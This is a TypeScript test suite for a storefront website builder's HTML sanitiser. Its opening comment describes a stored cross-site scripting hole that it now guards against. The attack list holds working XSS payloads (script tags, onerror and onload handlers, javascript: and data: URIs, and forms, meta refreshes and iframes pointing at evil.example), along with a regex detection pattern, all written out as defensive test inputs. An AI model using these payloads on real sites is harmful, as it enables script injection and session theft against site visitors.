/**
 * ===========================================================================
 *  CREATOR HTML CANNOT RUN ON STORELIB.COM
 * ===========================================================================
 * Five sections put a setting straight into the DOM, the engine's `raw`
 * filter lets a template do the same, and nothing anywhere sanitised any of
 * it. The control registry claimed a richtext value was "stored as sanitised
 * HTML"; the save routes did not look at it; and the rich text control is a
 * plain textarea, so the field was a box somebody types HTML into.
 *
 * That is not self-inflicted, because a published storefront is served from
 * storelib.com/<username>. Script in one creator's rich text ran on the
 * platform's own origin in the session of any signed-in visitor who opened
 * their store.
 *
 * This suite is the attack list. Every case here was reachable before.
 *
 * Run with:  npm run test:push
 */

import { readFileSync } from "node:fs"
import { join } from "node:path"

import { sanitizeRichText, sanitizeCustomHtml, sanitizeEmbedCode, htmlFieldsOf } from "@/lib/website-builder/sanitize"
import { sanitizeSections, sanitizeThemeSettings } from "@/lib/website-builder/sanitize-sections"
import type { SectionInstance } from "@/lib/website-builder/types"

const root = process.cwd()
let passed = 0
let failed = 0
const failures: string[] = []

function check(name: string, ok: boolean, detail?: string) {
  if (ok) { passed++; console.log(`  ok    ${name}`) }
  else { failed++; failures.push(name); console.log(`  FAIL  ${name}${detail ? `\n        ${detail}` : ""}`) }
}
function section(title: string) { console.log(`\n${title}`) }

/** Nothing that could execute, by any of the usual routes. */
const DANGEROUS = /<script|<svg|<form|<object|<embed\b|on\w+\s*=|javascript:|data:text\/html|<meta|<base|<link/i

// ===========================================================================
section("Rich text: an allow list, and everything else goes")
// ===========================================================================

{
  const attacks: [string, string][] = [
    ["a script tag", "<p>hi</p><script>alert(1)</script>"],
    ["an inline handler", `<img src=x onerror="alert(1)">`],
    ["an svg handler", "<svg onload=alert(1)></svg>"],
    ["a javascript: href", `<a href="javascript:alert(1)">x</a>`],
    ["a javascript: href with padding", `<a href="  jAvAsCrIpT:alert(1)">x</a>`],
    ["an svg data uri", `<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pg==">`],
    ["an html data uri", `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`],
    ["a style url", `<p style="background:url(javascript:alert(1))">x</p>`],
    ["a form post", `<form action="https://evil.example"><input name="p"></form>`],
    ["a meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
    ["a base tag", `<base href="https://evil.example/">`],
    ["a stylesheet link", `<link rel="stylesheet" href="https://evil.example/x.css">`],
    ["an iframe", `<iframe src="https://evil.example"></iframe>`],
    ["an object", `<object data="https://evil.example/x.swf"></object>`],
    ["a nested handler", `<div><span><b onmouseover="alert(1)">x</b></span></div>`],
    ["an unclosed script", `<script>alert(1)`],
    ["a broken tag", `<scr<script>ipt>alert(1)</script>`],
  ]
  const survived = attacks.filter(([, html]) => DANGEROUS.test(sanitizeRichText(html)))
  check(
    `all ${attacks.length} attacks come back inert`,
    survived.length === 0,
    survived.map(([name, html]) => `${name}: ${sanitizeRichText(html)}`).join("\n        "),
  )

  check(
    "and real markup survives, or the control is useless",
    sanitizeRichText('<h3>Title</h3><p><strong>bold</strong> <em>italic</em> <a href="/about">link</a></p><ul><li>one</li></ul>') ===
      '<h3>Title</h3><p><strong>bold</strong> <em>italic</em> <a href="/about">link</a></p><ul><li>one</li></ul>',
    sanitizeRichText('<h3>Title</h3><p><strong>bold</strong> <em>italic</em> <a href="/about">link</a></p><ul><li>one</li></ul>'),
  )
  check(
    "a link to another site keeps its href",
    sanitizeRichText('<a href="https://example.com">x</a>').includes('href="https://example.com"'),
  )
  check(
    "a mailto and a tel survive, because a contact paragraph is made of them",
    sanitizeRichText('<a href="mailto:a@b.com">mail</a><a href="tel:+123">call</a>').includes("mailto:") &&
      sanitizeRichText('<a href="tel:+123">call</a>').includes("tel:"),
  )
  check(
    "a new tab cannot reach back through window.opener",
    /rel="noopener noreferrer"/.test(sanitizeRichText('<a href="https://x.example" target="_blank">x</a>')),
  )
  check(
    "the text inside a dropped script does not become visible text",
    // `nonTextTags`: without it the page shows the source of the attack.
    !sanitizeRichText("<p>a</p><script>alert(1)</script>").includes("alert"),
  )
  check("an empty or absent value is an empty string", sanitizeRichText(undefined) === "" && sanitizeRichText(null) === "" && sanitizeRichText(12) === "")
}

// ===========================================================================
section("Custom HTML and pasted embeds: wider, and still unable to execute")
// ===========================================================================

{
  check(
    "a custom HTML block keeps layout markup",
    sanitizeCustomHtml('<section class="x"><header>Hi</header><video src="https://a.example/v.mp4" controls></video></section>').includes("<video"),
  )
  check("and still loses a script", !DANGEROUS.test(sanitizeCustomHtml("<div>ok</div><script>alert(1)</script>")))
  check(
    "an iframe is allowed only from a host we recognise",
    sanitizeCustomHtml('<iframe src="https://www.youtube.com/embed/abc"></iframe>').includes("youtube.com/embed/abc") &&
      !sanitizeCustomHtml('<iframe src="https://evil.example/x"></iframe>').includes("evil.example"),
  )
  check(
    "a pasted map embed keeps the iframe and its size",
    (() => {
      const out = sanitizeEmbedCode('<iframe src="https://www.google.com/maps/embed?pb=1" width="600" height="450" style="border:0" allowfullscreen loading="lazy"></iframe>')
      return out.includes("google.com/maps/embed") && out.includes('width="600"') && out.includes("border:0")
    })(),
  )
  check(
    "and drops a style that could fetch or cover the page",
    !sanitizeEmbedCode('<iframe src="https://www.google.com/maps/embed?pb=1" style="position:fixed;top:0;background:url(https://evil.example/x)"></iframe>').includes("position"),
  )
  check("a pasted script is not an embed", sanitizeEmbedCode("<script>alert(1)</script>") === "")
  check(
    "an embed from a host we do not know keeps nothing",
    !sanitizeEmbedCode('<iframe src="https://evil.example/x"></iframe>').includes("evil.example"),
  )
}

// ===========================================================================
section("A page's worth of it, by what the schema says each setting is")
// ===========================================================================

{
  const page = [
    { id: "s1", type: "rich_text", name: "Rich text", settings: { body: "<p>ok</p><script>alert(1)</script>", heading: "Fine <b>markup</b> in a text field" } },
    { id: "s2", type: "faq", name: "FAQ", settings: {}, blocks: [{ id: "b1", type: "item", settings: { answer: `<img src=x onerror="alert(1)">` } }] },
    { id: "s3", type: "map_embed", name: "Map", settings: { embed_code: '<iframe src="https://evil.example"></iframe><script>x</script>' } },
    { id: "s4", type: "custom_html", name: "HTML", settings: { html_content: "<div>fine</div><script>alert(1)</script>" } },
  ] as unknown as SectionInstance[]
  const clean = sanitizeSections(page)
  const s = (i: number) => clean[i].settings as Record<string, string>

  check("a rich text body is cleaned", !DANGEROUS.test(s(0).body))
  check(
    "and a plain text setting beside it is left exactly alone",
    // A `text` setting is escaped on the way out, so rewriting it here would
    // be the engine editing somebody's copy for no reason.
    s(0).heading === "Fine <b>markup</b> in a text field",
  )
  check("a block's answer is cleaned", !DANGEROUS.test((clean[1].blocks?.[0].settings as Record<string, string>).answer))
  check("a pasted embed is cleaned", !DANGEROUS.test(s(2).embed_code) && !s(2).embed_code.includes("evil.example"))
  check("a custom html block is cleaned", !DANGEROUS.test(s(3).html_content) && s(3).html_content.includes("<div>fine</div>"))

  const untouched = [{ id: "x", type: "hero", name: "Hero", settings: { heading: "Hi" } }] as unknown as SectionInstance[]
  check(
    "a page with nothing to clean comes back as the same object",
    // So a read path can sanitise every render without allocating a new page
    // each time.
    sanitizeSections(untouched) === untouched,
  )

  check(
    "the theme's own html settings are cleaned too",
    !DANGEROUS.test(String(sanitizeThemeSettings({ announcement_bar_text: "<b>Sale</b><script>alert(1)</script>" }).announcement_bar_text)),
  )

  check(
    "a section type nobody knows still has its known html ids cleaned",
    // A section the creator wrote has no entry in the registry, so the id
    // list is the only thing that can speak for it.
    !DANGEROUS.test(String((sanitizeSections([
      { id: "z", type: "their_own_section", name: "Theirs", settings: { body: "<p>a</p><script>alert(1)</script>" } },
    ] as unknown as SectionInstance[])[0].settings as Record<string, string>).body)),
  )

  check(
    "the schema decides, so a richtext field with an unusual name is found",
    Object.keys(htmlFieldsOf([{ id: "long_story", type: "richtext" }])).includes("long_story"),
  )
}

// ===========================================================================
section("It is applied where it has to be")
// ===========================================================================

{
  const read = (f: string) => readFileSync(join(root, f), "utf8")
  check(
    "on save, which is the authority",
    /sanitizeSections\(/.test(read("app/api/website-builder/themes/[installId]/sections/route.ts")) &&
      /sanitizeThemeSettings\(/.test(read("app/api/website-builder/themes/[installId]/settings/route.ts")),
  )
  check(
    "and on read, because the database already holds what was saved before this existed",
    /sanitizeSections\(/.test(read("lib/website-builder/published-site.ts")) &&
      /sanitizeSections\(/.test(read("app/(marketing)/w/[username]/render-site.tsx")) &&
      /sanitizeSections\(/.test(read("components/website-builder/theme/render-product.tsx")),
  )
  check(
    "the sanitiser stays on the server",
    // The section renderers are client components. What they are handed has
    // been through this already, so none of it is bundled to a browser.
    !/"use client"/.test(read("lib/website-builder/sanitize.ts")) &&
      !/"use client"/.test(read("lib/website-builder/sanitize-sections.ts")),
  )
}

console.log(`\n${passed} passed, ${failed} failed`)
if (failed > 0) {
  console.log(`\nFailed:\n${failures.map((f) => `  - ${f}`).join("\n")}`)
  process.exit(1)
}
